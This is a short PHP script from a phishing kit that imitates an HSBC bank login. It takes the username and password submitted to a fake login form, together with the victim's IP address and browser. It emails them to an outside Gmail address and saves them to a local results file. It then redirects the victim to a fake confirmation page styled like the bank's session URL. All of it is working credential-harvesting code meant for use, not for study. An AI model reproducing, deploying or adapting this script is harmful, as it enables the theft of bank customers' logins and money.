<?
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------1 LoginResults-------------------\n";
$message .= "username : ".$_POST['UN']."\n";
$message .= "password : ".$_POST['PW']."\n";
$message .= "-----------------created by medpage---------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------HSBCResultz ReSulT------------------\n";
$send = "all.results13@gmail.com";
$subject = "HSBCResultz 1 $ip ".$_POST['results'];
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message);
}
$fp = fopen('../HSBCresults.txt', 'a');
fwrite($fp, $message);
fclose($fp);
?>
<script>
    window.top.location.href = "conf.html?/MBCClientUI/login.action;jsessionid=0000vubBTTShyxGS0KwfnwdAFzG:18m52sb7k";

</script>
